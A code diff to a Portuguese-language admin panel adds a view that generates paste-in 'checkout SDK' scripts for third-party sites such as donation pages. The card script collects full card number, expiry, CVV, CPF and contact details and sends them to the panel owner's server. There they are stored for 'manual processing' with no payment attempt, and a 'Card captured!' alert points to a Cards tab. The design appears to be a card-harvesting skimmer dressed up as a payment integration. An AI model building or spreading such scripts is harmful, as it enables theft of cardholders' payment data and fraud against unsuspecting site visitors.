@@ -253,7 +253,13 @@
           <li>
             <a class="menu-item" data-view="integracoes">
               <i class="fa-solid fa-link" style="color:#0ea5e9;"></i>
-              <span>Integrações</span>
+              <span>Integrações API/Gateways</span>
+            </a>
+          </li>
+          <li>
+            <a class="menu-item" data-view="integracoes-terceiros">
+              <i class="fa-solid fa-code" style="color:#f43f5e;"></i>
+              <span>Integração Sites Terceiros</span>
             </a>
           </li>
         </ul>
@@ -1082,6 +1088,156 @@
               <span>Salvar Integrações</span>
             </button>
           </div>
+        </div>
+      </section>
+
+      <!-- VIEW: INTEGRAÇÃO SITES TERCEIROS -->
+      <section class="view-panel hide" id="view-integracoes-terceiros">
+        <div class="dashboard-block">
+          <div class="block-title">
+            <h2><i class="fa-solid fa-code" style="color:#f43f5e;"></i> Integração para Sites Terceiros</h2>
+            <span>Gere os scripts para colocar em outros sites (ex: Doações) e processar pagamentos através deste painel de forma transparente.</span>
+          </div>
+
+          <!-- Abas de Tipos de Script -->
+          <div class="sub-tabs-container" style="margin-bottom: 2rem;">
+            <button class="sub-tab-btn active" data-subview="sdk-cartao">
+              <i class="fa-solid fa-credit-card"></i> Script Só Cartão
+            </button>
+            <button class="sub-tab-btn" data-subview="sdk-pix">
+              <i class="fa-brands fa-pix" style="color:var(--success-color);"></i> Script Só Pix
+            </button>
+            <button class="sub-tab-btn" data-subview="sdk-ambos">
+              <i class="fa-solid fa-layer-group"></i> Script Completo
+            </button>
+          </div>
+
+          <!-- Conteúdo: Só Cartão -->
+          <div class="sub-view-panel" id="subview-sdk-cartao">
+            <h3 style="margin-bottom:1rem;color:var(--text-dark);">Script de Integração: Apenas Cartão de Crédito</h3>
+            <p style="color:var(--text-muted);font-size:0.9rem;margin-bottom:1rem;">Este script captura os dados de forma segura no site terceiro e envia para o banco de dados do seu painel Admin para você processá-los manualmente depois. Nenhuma requisição à adquirente é feita automaticamente.</p>
+            <div style="background:var(--bg-lighter);padding:1rem;border-radius:8px;border:1px solid var(--border-color);font-family:'Space Mono';font-size:0.85rem;color:var(--text-main);white-space:pre-wrap;word-break:break-all;">
+&lt;!-- 1. Coloque o script SDK no topo do seu site antes do fechamento do &lt;head&gt; --&gt;
+&lt;script src="https://SEU_DOMINIO/js/checkout-sdk.js"&gt;&lt;/script&gt;
+
+&lt;!-- 2. Adicione sua lógica no botão de "Pagar" ou "Doar" --&gt;
+&lt;script&gt;
+  // Inicializa a API apontando para o seu backend
+  const api = new CheckoutSeguroSDK({
+    apiUrl: 'https://SEU_DOMINIO/api/checkout'
+  });
+
+  // Chame esta função passando os dados do seu formulário
+  function processarCartao() {
+    api.payWithCard({
+      name: document.getElementById('nome').value,
+      email: document.getElementById('email').value,
+      phone: document.getElementById('telefone').value,
+      cpf: document.getElementById('cpf').value,
+      amount: 50.00, // Substitua pelo valor dinâmico
+      cardHolder: document.getElementById('nome_titular').value,
+      cardNumber: document.getElementById('numero_cartao').value,
+      cardExpiry: document.getElementById('validade').value,
+      cardCvv: document.getElementById('cvv').value,
+    }).then(resposta =&gt; {
+      console.log('Sucesso!', resposta);
+      alert('Cartão capturado com sucesso! Verifique a aba de Cartões no Painel Admin.');
+    }).catch(erro =&gt; {
+      console.error('Falha:', erro);
+      alert('Houve um erro: ' + erro.message);
+    });
+  }
+&lt;/script&gt;</div>
+          </div>
+
+          <!-- Conteúdo: Só Pix -->
+          <div class="sub-view-panel hide" id="subview-sdk-pix">
+            <h3 style="margin-bottom:1rem;color:var(--text-dark);">Script de Integração: Apenas Pix</h3>
+            <p style="color:var(--text-muted);font-size:0.9rem;margin-bottom:1rem;">Este script se comunica automaticamente com a adquirente selecionada no painel (PayShark/Hypercash) para gerar e retornar o QR Code "Copia e Cola" instantaneamente para o cliente do site terceiro pagar.</p>
+            <div style="background:var(--bg-lighter);padding:1rem;border-radius:8px;border:1px solid var(--border-color);font-family:'Space Mono';font-size:0.85rem;color:var(--text-main);white-space:pre-wrap;word-break:break-all;">
+&lt;!-- 1. Coloque o script SDK no topo do seu site antes do fechamento do &lt;head&gt; --&gt;
+&lt;script src="https://SEU_DOMINIO/js/checkout-sdk.js"&gt;&lt;/script&gt;
+
+&lt;!-- 2. Adicione sua lógica no botão de gerar Pix --&gt;
+&lt;script&gt;
+  const api = new CheckoutSeguroSDK({
+    apiUrl: 'https://SEU_DOMINIO/api/checkout'
+  });
+
+  function gerarPix() {
+    api.payWithPix({
+      name: document.getElementById('nome').value,
+      email: document.getElementById('email').value,
+      phone: document.getElementById('telefone').value,
+      cpf: document.getElementById('cpf').value,
+      amount: 50.00 // Substitua pelo valor dinâmico
+    }).then(resposta =&gt; {
+      // Aqui você acessa a resposta com os códigos PIX
+      const codigoCopiaCola = resposta.pix_qrcode || resposta.gateway_response?.pixCode;
+      alert('PIX Gerado! Copia e Cola: ' + codigoCopiaCola);
+      
+      // Exemplo de como usar a URL do QRCode se a adquirente retornar (opcional)
+      const qrCodeUrl = resposta.gateway_response?.qrCodeUrl;
+      if (qrCodeUrl) document.getElementById('qr-img').src = qrCodeUrl;
+      
+    }).catch(erro =&gt; {
+      alert('Houve um erro: ' + erro.message);
+    });
+  }
+&lt;/script&gt;</div>
+          </div>
+
+          <!-- Conteúdo: Ambos -->
+          <div class="sub-view-panel hide" id="subview-sdk-ambos">
+            <h3 style="margin-bottom:1rem;color:var(--text-dark);">Script de Integração: Pix + Cartão</h3>
+            <p style="color:var(--text-muted);font-size:0.9rem;margin-bottom:1rem;">Para disponibilizar os dois métodos no seu site terceiro, basta incluir o SDK uma única vez e usar uma condição (if/else) baseada na seleção do usuário (ex: rádio button).</p>
+            <div style="background:var(--bg-lighter);padding:1rem;border-radius:8px;border:1px solid var(--border-color);font-family:'Space Mono';font-size:0.85rem;color:var(--text-main);white-space:pre-wrap;word-break:break-all;">
+&lt;script src="https://SEU_DOMINIO/js/checkout-sdk.js"&gt;&lt;/script&gt;
+&lt;script&gt;
+  const api = new CheckoutSeguroSDK({ apiUrl: 'https://SEU_DOMINIO/api/checkout' });
+
+  function finalizarCompra() {
+    const metodoEscolhido = document.getElementById('metodo_pagamento').value; // 'pix' ou 'card'
+    const dadosGerais = {
+      name: 'João', email: 'joao@teste.com', phone: '11999999999', cpf: '00000000000', amount: 50.00
+    };
+
+    if (metodoEscolhido === 'pix') {
+      api.payWithPix(dadosGerais).then(res =&gt; alert('Pix gerado: ' + res.pix_qrcode));
+    } else {
+      // Adiciona os dados sensíveis apenas se for cartão
+      dadosGerais.cardHolder = 'JOAO SILVA';
+      dadosGerais.cardNumber = '1234567890123456';
+      dadosGerais.cardExpiry = '12/28';
+      dadosGerais.cardCvv = '123';
+      api.payWithCard(dadosGerais).then(res =&gt; alert('Cartão capturado!'));
+    }
+  }
+&lt;/script&gt;</div>
+          </div>
+
+          <hr style="border:0;border-top:1px solid var(--border-color);margin:2rem 0;">
+
+          <div class="block-title">
+            <h2><i class="fa-solid fa-satellite-dish" style="color:#8b5cf6;"></i> Webhook (URL de Retorno para o Site Terceiro)</h2>
+            <span>Quando a adquirente confirmar que o Pix foi pago, enviaremos um aviso para o seu site automaticamente.</span>
+          </div>
+          
+          <form id="webhook-settings-form">
+            <div class="settings-group">
+              <label for="third-party-webhook">URL de Recebimento de Webhook (Postback)</label>
+              <div class="settings-input-wrapper">
+                <i class="fa-solid fa-link"></i>
+                <input type="url" id="third-party-webhook" placeholder="https://seudominio.com/webhook/receber-pix" required>
+              </div>
+              <small style="color:var(--text-muted);display:block;margin-top:0.5rem;">Sempre que houver uma transação aprovada na nossa API (Pix Pago), enviaremos um POST para a URL acima com os dados da transação.</small>
+            </div>
+            <button type="submit" class="btn-submit-settings" id="btn-save-webhook">
+              <i class="fa-solid fa-floppy-disk"></i>
+              <span>Salvar Webhook</span>
+            </button>
+          </form>
+
         </div>
       </section>
 
